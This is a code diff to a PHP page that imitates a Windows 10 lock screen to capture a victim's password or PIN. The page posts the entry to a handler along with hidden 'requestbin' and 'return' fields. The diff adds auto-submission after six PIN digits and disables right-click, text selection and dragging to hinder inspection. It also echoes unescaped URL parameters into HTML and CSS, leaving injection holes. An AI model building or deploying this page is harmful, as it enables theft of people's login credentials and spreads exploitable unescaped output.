@@ -15,7 +15,7 @@
   if (isset($_GET["background"])) {
     $bg = $_GET["background"];
   } else {
-    $bg = "../i/windows/img0.jpg";
+    $bg = "../i/windows/default.jpg";
   }
   # Profile
   if (isset($_GET["profile"])) {
@@ -33,7 +33,7 @@
   if (isset($_GET["mail"])) {
     $mail = $_GET["mail"];
   } else {
-    $mail = "";
+    $mail = "Locked";
   }
   # Return URL
   if (isset($_GET["return"])) {
@@ -46,6 +46,12 @@
     $os = $_GET["os"];
   } else {
     $os = "windows10";
+  }
+  # Text Colour --> black / white
+  if (isset($_GET["text"])) {
+    $text = $_GET["text"];
+  } else {
+    $text = "black";
   }
   $type = strtolower($type);
   if ($type == "pin") {
@@ -60,6 +66,7 @@
 <head>
   <title> Client </title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
   <style>
   .content {
     margin: 0;
@@ -78,15 +85,33 @@
     font-family: font;
     src: url(../fonts/font.woff);
   }
-
-  * {
+  @font-face {
+    font-family: passwordfont;
+    src: url(../fonts/passwordfont.ttf);
+  }
+  p.user {
     font-family: font;
     font-weight: 600;
+    font-size: 33px;
+    color: <?php echo $text; ?>;
   }
   body, html {
     height: 100%;
   }
-
+  p {
+    margin: 0 0 0 0;
+  }
+  p.locked {
+    font-family: font;
+    font-weight: 600;
+    font-size: 16px;
+    color: <?php echo $text; ?>;
+  }
+  input[type="password"] {
+    font-family: passwordfont;
+    font-weight: normal;
+    font-size: 20.25px;
+  }
   .bg {
     background-image: url(<?php echo $bg; ?>);
 
@@ -97,45 +122,52 @@
     background-size: cover;
   }
   input[type="password"] {
-    width: 200px;
+    width: 300px;
     height: 35px;
-    padding-right: 50px;
+    margin-right: -20px;
+    padding-right: 35px;
     padding-left: 13px;
     border: 0;
     outline: none;
   }
-
-  input[type="submit"] {
-    margin-left: -50px;
+  input[type="image"] {
+    margin-left: 0px;
+    margin-bottom: -10px;
     height: 35px;
-    width: 50px;
+    width: 35px;
     color: black;
     border: 0;
     background-color: white;
     outline: none;
   }
+  img.profile {
+    opacity: 0.9;
+  }
+  #form-submit {
+    visibility: hidden;
+  }
   </style>
 </head>
-<body class="bg">
+<body class="bg" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+  <?php
+    if ($type == "PIN") {
+      echo "<script>
+      $('#password').keyup(function(){
+        if(this.value.length ==6){
+          $('#form-submit').click();
+        }
+      });
+      </script>";
+    }
+  ?>
   <div class="content">
     <?php
-    if (isset($profile)) {
-      echo "<center><img src='$profile' alt='user'</center>";
-    } else {
-
-    }
-    if (isset($name)) {
-      echo "<center><h2>$name</h2></center>";
-    } else {
-
-    }
-    if (isset($mail)) {
-      echo "<center><p>$mail</p></center>";
-    } else {
-
-    }
+    # Profile Image
+    echo "<center><img class='profile' src='$profile' alt='user'</center>";
+    # Name + Email
+    echo "<center><p class='user'>$name</p><p>&nbsp</p><p class='locked'>$mail</p><br><br></center>";
     ?>
-    <form action="../includes/post-password.inc.php" method="post">
+    <form action="../includes/post-password.inc.php" method="post" id="form">
       <input type="hidden" name="name" value="<?php echo $name; ?>">
       <input type="hidden" name="mail" value="<?php echo $mail; ?>">
       <input type="hidden" name="type" value="<?php echo $type; ?>">
@@ -144,8 +176,14 @@
       <input type="hidden" name="requestbin" value="<?php echo $requestbin; ?>">
       <input type="hidden" name="error" value="<?php echo $error; ?>">
       <input type="hidden" name="return" value="<?php echo $return; ?>">
-      <input type="password" name="password" value="" placeholder="<?php echo $type; ?>" required>
-      <input type="submit" name="password-submit" value="Next">
+      <input type="password" name="password" id="password" value="" placeholder="<?php echo $type; ?>">
+      <?php
+        if ($type == "Password") {
+          echo "<input type='image' name='password-submit' src='../i/arrow.png' alt='Submit' width='35' height='35'>";
+        } else {
+          echo '<input type="submit" name="password-submit" value="" id="form-submit">';
+        }
+      ?>
     </form>
   </div>
 </body>
